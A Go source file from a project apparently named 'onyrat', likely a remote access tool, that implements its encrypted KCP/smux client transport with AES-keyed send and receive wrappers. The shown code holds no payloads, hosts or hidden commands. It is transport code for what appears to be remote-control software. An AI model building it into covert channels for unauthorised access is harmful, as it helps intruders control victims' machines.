package network

import (
	"context"
	"fmt"
	"io"
	"time"

	"github.com/Onyz107/onyrat/internal/crypto"
	"github.com/xtaci/kcp-go/v5"
	"github.com/xtaci/smux"
)

type KCPClient struct {
	Sess       *kcp.UDPSession
	LastSeen   time.Time
	ID         int
	Manager    *StreamManager
	AESKey     []byte
	Authorized bool
	Ctx        context.Context
	cancel     context.CancelCauseFunc
	done       chan error
}

func NewClient(addr string, ctx context.Context) (*KCPClient, error) {
	inCtx, cancel := context.WithCancelCause(ctx)

	conn, err := kcp.DialWithOptions(addr, nil, 0, 0)
	if err != nil {
		cancel(fmt.Errorf("failed to connect to server: %w", err))
		return nil, fmt.Errorf("failed to connect to server: %w", err)
	}

	// Performance optimizations
	conn.SetWindowSize(512, 512)
	conn.SetNoDelay(1, 40, 2, 1)

	sess, err := smux.Client(conn, nil)
	if err != nil {
		conn.Close()
		cancel(fmt.Errorf("failed to create a session: %w", err))
		return nil, fmt.Errorf("failed to create a session: %w", err)
	}

	streamManager := NewStreamManager(sess)

	client := &KCPClient{
		Sess:    conn,
		Manager: streamManager,
		AESKey:  crypto.GenerateAESKey(256),
		Ctx:     inCtx,
		cancel:  cancel,
	}

	return client, nil
}

func (c *KCPClient) Disconnect() {
	c.cancel(fmt.Errorf("disconnected by user"))
}

func (c *KCPClient) Close() error {
	c.cancel(nil)
	return c.Sess.Close()
}

func (c *KCPClient) Send(stream *smux.Stream, data []byte, timeout time.Duration) error {
	select {

	case <-c.Ctx.Done():
		return fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))

	default:
		return send(stream, data, timeout)

	}
}

func (c *KCPClient) NewStreamedSender(stream *smux.Stream, timeout time.Duration) (io.WriteCloser, error) {
	select {

	case <-c.Ctx.Done():
		return nil, fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))

	default:
		return newStreamedSender(stream, timeout), nil

	}
}

func (c *KCPClient) SendSerialized(stream *smux.Stream, data []byte, timeout time.Duration) error {
	select {

	case <-c.Ctx.Done():
		return fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))

	default:
		return sendSerialized(stream, data, timeout)

	}
}

func (c *KCPClient) SendEncrypted(stream *smux.Stream, data []byte, timeout time.Duration) error {
	select {

	case <-c.Ctx.Done():
		return fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))

	default:
		return sendEncrypted(stream, data, c.AESKey, timeout)

	}
}

func (c *KCPClient) NewStreamedEncryptedSender(stream *smux.Stream, timeout time.Duration) (io.WriteCloser, error) {
	select {

	case <-c.Ctx.Done():
		return nil, fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))

	default:
		return newStreamedEncryptedSender(stream, c.AESKey, timeout)

	}
}

func (c *KCPClient) Receive(stream *smux.Stream, buf []byte, timeout time.Duration) error {
	select {

	case <-c.Ctx.Done():
		return fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))

	default:
		return receive(stream, buf, timeout)

	}
}

func (c *KCPClient) NewStreamedReceiver(stream *smux.Stream, timeout time.Duration) (io.ReadCloser, error) {
	select {

	case <-c.Ctx.Done():
		return nil, fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))

	default:
		return newStreamedReceiver(stream, timeout), nil

	}
}

func (c *KCPClient) ReceiveSerialized(stream *smux.Stream, buf []byte, timeout time.Duration) (uint64, error) {
	select {

	case <-c.Ctx.Done():
		return 0, fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))

	default:
		return receiveSerialized(stream, buf, timeout)

	}
}

func (c *KCPClient) ReceiveEncrypted(stream *smux.Stream, buf []byte, timeout time.Duration) (uint64, error) {
	select {

	case <-c.Ctx.Done():
		return 0, fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))

	default:
		return receiveEncrypted(stream, buf, c.AESKey, timeout)

	}
}

func (c *KCPClient) NewStreamedEncryptedReceiver(stream *smux.Stream, timeout time.Duration) (io.ReadCloser, error) {
	select {

	case <-c.Ctx.Done():
		return nil, fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))

	default:
		return newStreamedEncryptedReceiver(stream, c.AESKey, timeout)

	}
}
